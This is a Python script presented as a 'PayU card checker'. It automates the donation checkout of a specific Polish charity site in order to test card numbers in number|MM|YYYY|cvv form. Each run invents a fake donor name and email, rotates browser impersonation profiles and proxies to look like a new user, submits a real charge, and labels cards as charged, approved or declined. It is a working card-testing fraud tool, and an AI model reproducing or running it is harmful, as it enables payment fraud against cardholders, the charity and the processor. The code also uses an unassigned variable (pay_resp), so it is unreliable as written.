
"""
PayU card checker — centaurus.org.pl donation flow.

Full checkout replayed from a HAR capture:
  1. merchant create order (amount/currency/country + generated identity)
  2. tokenize the card           (Bearer JWT from the redirect URL)
  3. submit payment              (token + browserData fingerprint)
  4. 3DS poll (if the submit returns a threeds continueUrl)
  5. read the final /status result

Every run creates a fresh order + fresh identity (no session reuse), so each
checkout looks like a brand-new user. Uses the same curl_cffi impersonation
profiles as the Shopify checker.
"""
from __future__ import annotations

import asyncio
import random
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional, Tuple

from curl_cffi.requests import AsyncSession

# ── browser profile (same as Shopify v7) ─────────────────────────────
PROFILE_UA = {
    "chrome131": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "chrome133a": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "chrome136": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "chrome142": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "chrome145": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "chrome146": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "chrome150": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "firefox135": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
    "firefox144": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
    "safari180": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "safari153": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
}
BROWSER_PROFILES = list(PROFILE_UA.keys())

FIRST_NAMES = ['james', 'john', 'robert', 'michael', 'william', 'david', 'richard', 'joseph',
               'thomas', 'charles', 'daniel', 'matthew', 'anthony', 'mark', 'donald', 'steven',
               'paul', 'andrew', 'joshua', 'kenneth', 'kevin', 'brian', 'george', 'edward',
               'ronald', 'timothy', 'jason', 'jeffrey', 'ryan', 'jacob', 'mary', 'patricia',
               'jennifer', 'linda', 'elizabeth', 'barbara', 'susan', 'jessica', 'sarah', 'karen']
LAST_NAMES = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis',
              'rodriguez', 'martinez', 'anderson', 'taylor', 'thomas', 'moore', 'jackson',
              'martin', 'lee', 'white', 'harris', 'clark', 'lewis', 'robinson', 'walker',
              'young', 'allen', 'king', 'wright', 'scott', 'torres', 'nguyen', 'hill', 'flores']
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com", "aol.com", "mail.com"]


def generate_identity() -> Tuple[str, str, str]:
    """Fresh first name, last name, email for a new-user checkout."""
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    local = f"{first}{last}{random.randint(1, 999)}"
    email = f"{local}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email


# ── PayU endpoints ────────────────────────────────────────────────────
MERCHANT_CREATE_URL = "https://centaurus.org.pl/wp-json/centaurus/v1/payu/create"
PAYU_BASE = "https://secure.payu.com"
PAYU_PAY_URL = PAYU_BASE + "/pay/"


def parse_card(cc: str) -> Tuple[str, str, str, str]:
    """cc format: number|MM|YYYY|cvv  (same as Shopify)."""
    parts = str(cc).strip().split("|")
    if len(parts) != 4:
        raise Exception(f"invalid card format: {cc}")
    number, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    if len(year) == 2:
        year = "20" + year
    return number, month, year, cvv


# ── result mapping ────────────────────────────────────────────────────
# PayU /status "value" -> normalized code (Shopify-style vocabulary)
PAYU_RESULT_MAP = {
    # outcome
    "SUCCESS": "ORDER_PAID",
    # declines
    "CARD_INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
    "CARD_EXPIRED": "EXPIRE_CARD",
    "CARD_NOT_ACTIVE": "CARD_DECLINED",
    "CARD_STOLEN": "STOLEN_CARD",
    "CARD_LOST": "LOST_CARD",
    "CARD_INVALID": "INVALID_PAYMENT_METHOD",
    "CARD_CVV_INVALID": "INCORRECT_CVC",
    "CARD_DECLINED": "CARD_DECLINED",
    "CARD_REJECTED": "CARD_DECLINED",
    "REFUSED_BY_ISSUER": "CARD_DECLINED",
    "DECLINED_BY_ISSUER": "CARD_DECLINED",
    "NOT_AUTHORIZED": "CARD_DECLINED",
    "NOT_ACCEPTED": "CARD_DECLINED",
    "3DS_NOT_AUTHORIZED": "3DS_FAILED",
    "CARD_BLACKLISTED": "RESTRICTED_CARD",
    "BLOCKED_CARD": "RESTRICTED_CARD",
    "BLACKLISTED_CARD": "RESTRICTED_CARD",
    "LIMIT_EXCEEDED": "LIMIT_EXCEEDED",
    "FRAUD_DETECTED": "FRAUD_SUSPECTED",
    "GENERAL_ERROR": "GENERIC_ERROR",
    "INVALID_TRANSACTION": "GENERIC_ERROR",
    "3DS_AUTHENTICATION_FAILED": "3DS_FAILED",
    "CARD_3DS_REQUIRED": "3DS_REQUIRED",
    "3DS_AUTHENTICATION_REQUIRED": "3DS_REQUIRED",
    "AMOUNT_TOO_HIGH": "AMOUNT_TOO_HIGH",
    "AMOUNT_TOO_LOW": "AMOUNT_TOO_SMALL",
    "CURRENCY_NOT_SUPPORTED": "NOT_SUPPORTED",
    "CARD_NOT_SUPPORTED": "NOT_SUPPORTED",
    "WAITING_FOR_CONFIRMATION": "PROCESSING",
    "PENDING": "PROCESSING",
}

# normalized code -> clean label
APPROVED_CODES = {"INSUFFICIENT_FUNDS", "3DS_REQUIRED", "INCORRECT_CVC", "INCORRECT_ZIP", "EXPIRE_CARD"}


def response_label(code: str) -> str:
    u = (code or "").upper()
    if u == "ORDER_PAID":
        return "CHARGED"
    if u in APPROVED_CODES:
        return "APPROVED"
    if u in ("PROCESSING", "PENDING", "WAITING"):
        return "PENDING"
    return "DECLINED"


@dataclass
class PayuResult:
    cc: str
    response_code: str
    response: str
    real_response: str
    amount: str
    currency: str = "USD"
    gateway: str = "PayU"
    error: Optional[Exception] = None


def _browser_data(user_agent: str, timezone_offset: int) -> dict:
    return {
        "screenWidth": 1920,
        "javaEnabled": False,
        "timezoneOffset": timezone_offset,
        "screenHeight": 1080,
        "userAgent": user_agent,
        "colorDepth": 24,
        "language": "en-US",
        "challengeWindowSize": "04",
    }


async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                         country: str = "IN", timezone_offset: int = -330) -> PayuResult:
    """Run a full PayU checkout for one card. Every call = fresh order + fresh user."""
    number, month, year, cvv = parse_card(card_entry)
    first, last, email = generate_identity()
    full_name = f"{first} {last}"

    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = PROFILE_UA[impersonate]

    headers = {
        "User-Agent": user_agent,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
    }

    def new_session() -> AsyncSession:
        s = AsyncSession(impersonate=impersonate, timeout=30)
        s.headers.update(headers)
        if proxy_url:
            s.proxies = {"http": proxy_url, "https": proxy_url}
        return s

    s = new_session()

    try:
        # 1. create the order on the merchant
        create_payload = {
            "amount": float(amount) if amount else 1,
            "currency": "usd",
            "country": country,
            "full_name": full_name,
            "email": email,
            "target_id": "foundation",
            "terms": True,
            "newsletter": False,
            "payment_type": "one-time",
            "subscription": 0,
        }
        r = await s.post(
            MERCHANT_CREATE_URL,
            json=create_payload,
            headers={
                "Referer": "https://centaurus.org.pl/en/donate/",
                "Origin": "https://centaurus.org.pl",
                "Content-Type": "application/json",
            },
        )
        if r.status_code != 200:
            raise Exception(f"create order failed: HTTP {r.status_code}")
        create = r.json()
        redirect = create.get("redirect") or ""
        payuid = create.get("payuid") or ""
        if not redirect or not payuid:
            raise Exception("create order: missing redirect/payuid")

        # parse orderId + JWT from the redirect URL
        parsed = urllib.parse.urlparse(redirect)
        qs = urllib.parse.parse_qs(parsed.query)
        token = (qs.get("token") or [""])[0]
        order_id = (qs.get("orderId") or [""])[0]
        if not token or not order_id:
            raise Exception("create order: missing orderId/token in redirect")

        auth = {"Authorization": f"Bearer {token}"}
        payu_referer = PAYU_PAY_URL + "?orderId=" + order_id + "&token=" + urllib.parse.quote(token) + "&lang=en"
        api_headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "Origin": PAYU_BASE,
            "Referer": payu_referer,
        }

        # 2. fetch order details -> authoritative amount (minor units) + currency
        r = await s.get(f"{PAYU_BASE}/api/front/orders/{order_id}", headers=auth)
        if r.status_code != 200:
            raise Exception(f"order fetch failed: HTTP {r.status_code}")
        order = r.json()
        order_amount = order.get("amount") or int(float(amount) * 100)
        currency = (order.get("currency") or "USD").upper()

        # 3. tokenize the card (no name — optional per PayU)
        token_payload = {
            "posId": "PAYU S.A.",
            "type": "SINGLE",
            "card": {
                "number": number,
                "cvv": cvv,
                "expirationMonth": month,
                "expirationYear": year,
            },
        }
        r = await s.post(f"{PAYU_BASE}/api/front/tokens", json=token_payload, headers=api_headers)
        if r.status_code != 200:
            raise Exception(f"tokenize failed: HTTP {r.status_code}")
        tok = r.json()
        card_token = tok.get("value") or ""
        masked = tok.get("maskedCard") or (number[:6] + "******" + number[-4:])
        if not card_token:
            raise Exception("tokenize: no card token returned")

        # 4. submit the payment
        pay_payload = {
            "email": email,
            "firstName": first,
            "lastName": last,
            "currency": currency,
            "amount": order_amount,
            "payMethod": {
                "type": "c",
                "token": card_token,
                "cardDetails": {"maskedCardNumber": masked},
            },
            "metadata": {"cardInputTime": random.randint(3000, 8000)},
            "redirectUrl": PAYU_PAY_URL + "?orderId=" + order_id + "&token=%token%&lang=en",
            "mcpFxTableId": None,
            "mcpFxRate": None,
            "browserData": _browser_data(user_agent, timezone_offset),
            "language": "en",
            "invoice": None,
        }
        r = await s.post(f"{PAYU_BASE}/api/front/orders/{order_id}/payments", json=pay_payload, headers=api_headers)
        if r.status_code != 200:
            body = ""
            try:
                body = r.text[:500]
            except Exception:
                pass
            raise Exception(f"payment submit failed: HTTP {r.status_code} {body}")

        # immediate decline?
        err_code = pay_resp.get("errorCode")
        if err_code:
            return _finalize(card_entry, err_code, amount, currency)

        # 5. 3DS flow (if the submit returned a threeds continueUrl)
        continue_url = pay_resp.get("continueUrl") or ""
        m = re.search(r"authenticationId=([A-Za-z0-9-]+)", continue_url)
        auth_id = m.group(1) if m else ""

        if auth_id:
            for _ in range(10):
                r = await s.get(f"{PAYU_BASE}/api/threeds/authentications/{auth_id}", headers=auth)
                if r.status_code != 200:
                    break
                auth_resp = r.json()
                auth_status = (auth_resp.get("status") or "").upper()
                three_ds = auth_resp.get("threeDsSupported")
                # a real challenge (issuer ACS) can't be automated -> 3DS_REQUIRED
                if three_ds and (auth_resp.get("challengeUrl") or auth_resp.get("redirectUrl") or auth_resp.get("acsUrl")):
                    return _finalize(card_entry, "CARD_3DS_REQUIRED", amount, currency)
                if auth_status in ("FINISHED", "FAILED", "ERROR", "AUTHENTICATION_FAILED", "COMPLETED", "SUCCESS"):
                    break
                await asyncio.sleep(1.0)

        # 6. poll the final status until a terminal category (SUCCESS/ERROR)
        value = ""
        for _ in range(12):
            r = await s.get(f"{PAYU_BASE}/api/front/orders/{order_id}/status", headers=auth)
            if r.status_code != 200:
                raise Exception(f"status fetch failed: HTTP {r.status_code}")
            status_resp = r.json()
            category = (status_resp.get("category") or "").upper()
            value = (status_resp.get("value") or "")
            if category == "SUCCESS":
                return _finalize(card_entry, "SUCCESS", amount, currency)
            if category == "ERROR":
                return _finalize(card_entry, value or "GENERAL_ERROR", amount, currency)
            # NEW / WAITING / IN_PROGRESS -> keep polling
            await asyncio.sleep(2.0)

        return _finalize(card_entry, value or "IN_PROGRESS", amount, currency)

    finally:
        try:
            await s.close()
        except Exception:
            pass


def _finalize(card_entry: str, real_value: str, amount: str, currency: str) -> PayuResult:
    code = PAYU_RESULT_MAP.get(real_value.upper(), real_value.upper())
    label = response_label(code)
    return PayuResult(
        cc=card_entry,
        response_code=code,
        response=label,
        real_response=real_value,
        amount=_fmt_amount(amount),
        currency=currency,
    )


def _fmt_amount(a: object) -> str:
    try:
        return f"{float(a):.2f}"
    except Exception:
        return str(a or "0.00")
